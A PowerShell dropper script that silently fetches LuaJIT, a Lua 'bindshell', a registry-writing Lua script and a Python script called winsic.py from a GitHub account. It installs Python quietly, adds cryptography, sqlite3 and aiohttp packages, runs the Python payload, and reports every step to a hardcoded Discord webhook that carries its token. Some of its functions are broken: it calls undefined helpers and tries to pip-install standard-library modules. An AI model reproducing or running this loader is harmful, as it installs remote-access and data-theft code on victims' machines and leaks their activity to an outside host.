# Define paths and URLs
$baseDir = "$env:TEMP\ZZ"
$luaZip = "$baseDir\lua-5.4.2_Win64_bin.zip"
$luaZipUrl = "https://sourceforge.net/projects/luabinaries/files/5.4.2/Tools%20Executables/lua-5.4.2_Win64_bin.zip/download"
$luaJitZip = "$baseDir\LuaJIT-2.1.zip"
$luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"
$bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/bin.lua"
$regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
$extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
$ghostConfigPyUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/winsic.py"
$bindshellScriptPath = "$baseDir\bin.lua"
$regwriteScriptPath = "$baseDir\regwrite.lua"
$extraScriptPath = "$baseDir\main.lua"
$ghostConfigPyPath = "$baseDir\winsic.py"
$discordWebhookUrl = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
$luaJitPath = "$baseDir\LuaJIT-2.1"
$luaPathDir = "$baseDir\Luapath"
$jitDir = "$luaPathDir\src\jit"
$srcDir = "$luaPathDir\src"
$jitSourceDir = "$luaJitPath\src\jit"
$venvDir = "$baseDir\venv"

# Function to send messages to Discord webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )
    $payload = @{
        content = $message
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $payload -ContentType 'application/json'
}

# Function to check if a file exists and wait if it doesn't
function Wait-ForFile {
    param (
        [string]$FilePath,
        [int]$Timeout = 60000
    )
    $startTime = Get-Date
    while (-not (Test-Path -Path $FilePath)) {
        Start-Sleep -Seconds 1
        if ($startTime.AddMilliseconds($Timeout) -lt (Get-Date)) {
            $message = "Timeout waiting for file ${FilePath} to appear."
            Send-DiscordMessage -message $message
            exit 1
        }
    }
}

# Function to get a file using curl
function Get-File {
    param (
        [string]$url,
        [string]$destination
    )
    try {
        $message = "Getting file from $url to $destination..."
        Send-DiscordMessage -message $message
        Start-Process -FilePath "curl" -ArgumentList "-L", $url, "-o", $destination -NoNewWindow -Wait
        Wait-ForFile -FilePath $destination
        $message = "Download completed: $destination"
        Send-DiscordMessage -message $message
    } catch {
        $message = "Error getting file from: $(${_})"
        Send-DiscordMessage -message $message
        exit 1
    }
}

# Function to wait for a minute
function Wait-ForMinute {
    Send-DiscordMessage -message "Waiting for 5 seconds before next step..."
    Start-Sleep -Seconds 5
}

# Function to copy files with wait and notification
function Copy-File {
    param (
        [string]$Source,
        [string]$Destination
    )
    try {
        Copy-Item -Path $Source -Destination $Destination -Force
        $message = "Copied $Source to $Destination"
        Send-DiscordMessage -message $message
    } catch {
        $message = "Error copying $Source to $Destination $(${_})"
        Send-DiscordMessage -message $message
        exit 1
    }
}

# Function to get and extract LuaJIT
function Get-And-Extract-LuaJIT {
    if (-not (Test-Path "$luaJitPath\src\luajit.exe")) {
        $message = "Getting LuaJIT ZIP file..."
        Send-DiscordMessage -message $message
        # Get the ZIP file
        if (-not (Test-Path $luaJitZip)) {
            Get-File -url $luaJitUrl -destination $luaJitZip
            Wait-ForMinute

            # Wait for the download to complete
            Wait-ForFile -FilePath $luaJitZip
        }

        if (-not (Test-Path "$luaJitPath")) {
            $message = "Extracting LuaJIT ZIP file..."
            Send-DiscordMessage -message $message
            # Extract the ZIP file
            try {
                Expand-Archive -Path $luaJitZip -DestinationPath $baseDir
                $message = "Extraction completed to: $luaJitPath"
                Send-DiscordMessage -message $message
            } catch {
                $message = "Error extracting LuaJIT ZIP file: $(${_})"
                Send-DiscordMessage -message $message
                exit 1
            }
        } else {
            $message = "LuaJIT directory already exists: $luaJitPath"
            Send-DiscordMessage -message $message
        }

        # Confirm build by checking for luajit.exe
        Wait-ForFile -FilePath "$luaJitPath\src\luajit.exe"
        Wait-ForMinute
    } else {
        $message = "LuaJIT executable already exists: $luaJitPath\src\luajit.exe"
        Send-DiscordMessage -message $message
    }
}

# Create the base directory if it doesn't exist
if (-not (Test-Path $baseDir)) {
    New-Item -Path $baseDir -ItemType Directory -Force
    Send-DiscordMessage -message "Created base directory: $baseDir"
    Wait-ForMinute
}

# Get LuaJIT if not already done
Get-And-Extract-LuaJIT

# Download and extract Lua if not already done
if (-not (Test-Path "$baseDir\lua54.exe")) {
    $message = "Getting Lua ZIP file..."
    Send-DiscordMessage -message $message
    # Get the ZIP file
    if (-not (Test-Path $luaZip)) {
        Get-File -url $luaZipUrl -destination $luaZip
        Wait-ForMinute

        # Wait for the download to complete
        Wait-ForFile -FilePath $luaZip
    }

    $message = "Extracting Lua ZIP file..."
    Send-DiscordMessage -message $message
    # Extract the ZIP file
    try {
        Expand-Archive -Path $luaZip -DestinationPath $baseDir
        $message = "Extraction completed to: $baseDir"
        Send-DiscordMessage -message $message
        Wait-ForMinute
    } catch {
        $message = "Error extracting Lua ZIP file: $(${_})"
        Send-DiscordMessage -message $message
        exit 1
    }
} else {
    $message = "Lua executable already exists: $baseDir\lua54.exe"
    Send-DiscordMessage -message $message
}

# Create the Luapath directory and subdirectories if they don't exist
if (-not (Test-Path -Path $luaPathDir)) {
    New-Item -Path $luaPathDir -ItemType Directory -Force
    Send-DiscordMessage -message "Created directory: $luaPathDir"
    Wait-ForMinute
}

if (-not (Test-Path -Path $srcDir)) {
    New-Item -Path $srcDir -ItemType Directory -Force
    Send-DiscordMessage -message "Created directory: $srcDir"
    Wait-ForMinute
}

if (-not (Test-Path -Path $jitDir)) {
    New-Item -Path $jitDir -ItemType Directory -Force
    Send-DiscordMessage -message "Created directory: $jitDir"
    Wait-ForMinute
}

# Copy LuaJIT JIT files
$jitSourceDir = "$luaJitPath\src\jit"
if (Test-Path -Path $jitSourceDir) {
    Copy-File -Source "$jitSourceDir\*" -Destination $jitDir
    Wait-ForMinute
} else {
    $message = "JIT source directory does not exist: $jitSourceDir"
    Send-DiscordMessage -message $message
    exit 1
}

# Copy luajit.exe and lua51.dll to Luapath base directory
if (Test-Path -Path "$luaJitPath\src\luajit.exe") {
    Copy-File -Source "$luaJitPath\src\luajit.exe" -Destination "$luaPathDir\luajit.exe"
    Wait-ForMinute
} else {
    $message = "luajit.exe does not exist in the source directory: $luaJitPath\src"
    Send-DiscordMessage -message $message
    exit 1
}

if (Test-Path -Path "$luaJitPath\src\lua51.dll") {
    Copy-File -Source "$luaJitPath\src\lua51.dll" -Destination "$luaPathDir\lua51.dll"
    Wait-ForMinute
} else {
    $message = "lua51.dll does not exist in the source directory: $luaJitPath\src"
    Send-DiscordMessage -message $message
    exit 1
}

# Download Lua scripts
$bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/bin.lua"
$regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
$extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"

if (-not (Test-Path -Path $bindshellScriptPath)) {
    Get-File -url $bindshellScriptUrl -destination $bindshellScriptPath
}

if (-not (Test-Path -Path $regwriteScriptPath)) {
    Get-File -url $regwriteScriptUrl -destination $regwriteScriptPath
}

if (-not (Test-Path -Path $extraScriptPath)) {
    Get-File -url $extraScriptUrl -destination $extraScriptPath
}

# Download and execute winsic.py
if (-not (Test-Path -Path $ghostConfigPyPath)) {
    Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
}

# Function to check if Python is installed by checking its version
function PythonVersion {
    try {
        $pythonVersion = python --version 2>&1
        if ($pythonVersion -match "Python (\d+\.\d+\.\d+)") {
            $message = "Python is already installed: $($matches[1])"
            Send-DiscordMessage -message $message
            return $true
        } else {
            return $false
        }
    } catch {
        $message = "Python is not installed. Proceeding with installation..."
        Send-DiscordMessage -message $message
        return $false
    }
}

# Define paths
$pythonInstaller = "$baseDir\python-3.11.5-amd64.exe"
$pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
$maxRetries = 3
$retryCount = 0

# Function to download Python installer with retry logic
function PythonInstaller {
    while ($retryCount -lt $maxRetries) {
        try {
            Send-DiscordMessage -message "Attempting to download Python installer. Attempt $($retryCount + 1)..."
            Start-Process -FilePath "curl" -ArgumentList "-L", $pythonInstallerUrl, "-o", $pythonInstaller -NoNewWindow -Wait
            
            # Verify the download
            if (Test-Path -Path $pythonInstaller) {
                Send-DiscordMessage -message "Python installer downloaded successfully."
                return $true
            } else {
                throw "Python installer not found after download attempt."
            }
        } catch {
            Send-DiscordMessage -message "Download attempt $($retryCount + 1) failed. Error: $($_.Exception.Message)"
            $retryCount++
            Start-Sleep -Seconds 5
        }
    }

    Send-DiscordMessage -message "Failed to download Python installer after $maxRetries attempts."
    exit 1
}

# Function to install Python if not already installed
function Install-Python {
    if (-not (PythonVersion)) {
        # Download Python installer if Python is not installed
        PythonInstaller

        Send-DiscordMessage -message "Installing Python..."
        Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 TargetDir=$pythonDir" -NoNewWindow -Wait

        # Verify installation
        if (PythonVersion) {
            Send-DiscordMessage -message "Python installed successfully."
        } else {
            Send-DiscordMessage -message "Python installation failed. Retrying..."
            Install-Python
        }
    }
}

# Call the Install-Python function to check and install Python if necessary
Install-Python



# Function to install Python if not already installed
function PPython {
    if (-not (Check-PythonVersion)) {
        $pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
        Get-File -url $pythonInstallerUrl -destination $pythonInstaller

        Send-DiscordMessage -message "Installing Python..."
        Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 TargetDir=$pythonDir" -NoNewWindow -Wait

        # Verify installation
        if (Check-PythonVersion) {
            Send-DiscordMessage -message "Python installed successfully."
        } else {
            Send-DiscordMessage -message "Python installation failed. Retrying..."
            Install-Python
        }
    }
}

# Function to check if virtualenv is installed and get its version
function VirtualenvVersion {
    try {
        $venvVersion = python -m virtualenv --version 2>&1
        if ($venvVersion -match "(\d+\.\d+\.\d+)") {
            $message = "virtualenv is already installed: $($matches[1])"
            Send-DiscordMessage -message $message
            return $true
        } else {
            return $false
        }
    } catch {
        $message = "virtualenv is not installed. Attempting to install..."
        Send-DiscordMessage -message $message
        return $false
    }
}

# Function to install virtualenv if not already installed
function IVirtualenv {
    if (-not (Check-VirtualenvVersion)) {
        Send-DiscordMessage -message "Setting up Python environment..."
        python -m ensurepip
        python -m pip install --upgrade pip
        python -m pip install virtualenv

        # Verify installation
        if (Check-VirtualenvVersion) {
            Send-DiscordMessage -message "virtualenv installed successfully."
        } else {
            Send-DiscordMessage -message "virtualenv installation failed. Retrying..."
            Install-Virtualenv
        }
    }
}

# Function to create and verify the virtual environment
function CVirtualenv {
    if (-not (Test-Path -Path $venvDir)) {
        Send-DiscordMessage -message "Creating virtual environment..."
        python -m virtualenv $venvDir

        # Verify virtual environment creation
        if (Test-Path -Path "$venvDir\Scripts\activate.bat") {
            Send-DiscordMessage -message "Virtual environment created successfully."
        } else {
            Send-DiscordMessage -message "Virtual environment creation failed. Retrying..."
            Create-Virtualenv
        }
    } else {
        Send-DiscordMessage -message "Virtual environment already exists."
    }
}



# Install Python if necessary
PPython

# Install virtualenv if necessary
IVirtualenv

# Create the virtual environment
CVirtualenv

# Activate the virtual environment and proceed with the script
Send-DiscordMessage -message "Activating virtual environment..."
& "$venvDir\Scripts\activate.bat"


Send-DiscordMessage -message "Activating virtual environment..."
& "$venvDir\Scripts\activate.bat"

# Install required Python packages directly in the script
$packages = @(
    "ctypes",
    "platform",
    "json",
    "sys",
    "shutil",
    "sqlite3",
    "cryptography",
    "re",
    "os",
    "asyncio",
    "aiohttp",
    "base64",
    "time"
)

foreach ($package in $packages) {
    Send-DiscordMessage -message "Installing $package..."
    & "$venvDir\Scripts\pip.exe" install $package
    Send-DiscordMessage -message "Requirements installed successfully."

}

# Run the Python script
Send-DiscordMessage -message "Running the Python script..."
& "$venvDir\Scripts\python.exe" $ghostConfigPyPath

Send-DiscordMessage -message "All steps completed."
